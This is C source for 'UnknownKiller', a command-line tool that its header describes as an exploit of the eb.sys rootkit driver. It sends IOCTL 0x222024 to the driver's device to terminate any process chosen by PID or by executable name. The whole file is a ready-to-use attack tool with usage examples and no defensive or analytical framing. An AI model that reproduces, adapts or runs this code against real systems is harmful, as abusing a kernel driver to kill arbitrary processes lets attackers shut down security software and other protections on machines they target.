// UnknownKiller - Process Termination via eb.sys Rootkit Driver
// Exploits IOCTL 0x222024 for arbitrary process termination
// 2024

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#define DEVICE_PATH L"\\\\.\\eb"
#define IOCTL_KILL_PROCESS 0x222024

void PrintBanner() {
    printf("  UnknownKiller by @j3h4ck\n");
    printf("  Process Termination Exploit for eb.sys Driver\n");
    printf("  IOCTL: 0x222024 | Device: \\\\.\\eb\n");
    printf("\n");
}

BOOL KillProcessByPID(DWORD pid) {
    HANDLE hDevice = CreateFileW(
        DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        printf("[-] Failed to open device handle\n");
        printf("    Error code: %d\n", error);

        if (error == 2) {
            printf("    Reason: Driver not loaded\n");
        }
        else if (error == 5) {
            printf("    Reason: Access denied (run as Administrator)\n");
        }

        return FALSE;
    }

    printf("[+] Device handle opened\n");
    printf("[*] Sending termination request for PID %d\n", pid);

    DWORD bytesReturned;
    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_KILL_PROCESS,
        &pid,
        sizeof(DWORD),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (!result) {
        printf("[-] IOCTL call failed: %d\n", GetLastError());
        CloseHandle(hDevice);
        return FALSE;
    }

    CloseHandle(hDevice);

    Sleep(500);
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        printf("[+] Process terminated successfully\n");
        return TRUE;
    }

    CloseHandle(hProcess);
    printf("[!] Process may still be running\n");
    return FALSE;
}

DWORD GetPIDByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return 0;
}

void ShowUsage(const char* programName) {
    printf("Usage:\n");
    printf("  %s <pid>\n", programName);
    printf("  %s <process_name>\n\n", programName);
    printf("Examples:\n");
    printf("  %s 1234\n", programName);
    printf("  %s notepad.exe\n\n", programName);
}

int main(int argc, char* argv[]) {
    PrintBanner();

    if (argc != 2) {
        ShowUsage(argv[0]);
        return 1;
    }

    DWORD pid = 0;

    if (isdigit(argv[1][0])) {
        pid = atoi(argv[1]);

        if (pid == 0) {
            printf("[-] Invalid PID\n");
            return 1;
        }

        printf("[*] Target PID: %d\n", pid);
    }
    else {
        printf("[*] Searching for process: %s\n", argv[1]);
        pid = GetPIDByName(argv[1]);

        if (pid == 0) {
            printf("[-] Process not found\n");
            return 1;
        }

        printf("[+] Found PID: %d\n", pid);
    }

    if (pid == 4 || pid == 0) {
        printf("[!] Refusing to terminate critical system process\n");
        return 1;
    }

    printf("\n");

    if (KillProcessByPID(pid)) {
        printf("\n[SUCCESS] Process eliminated\n");
        return 0;
    }
    else {
        printf("\n[FAILED] Termination unsuccessful\n");
        return 1;
    }
}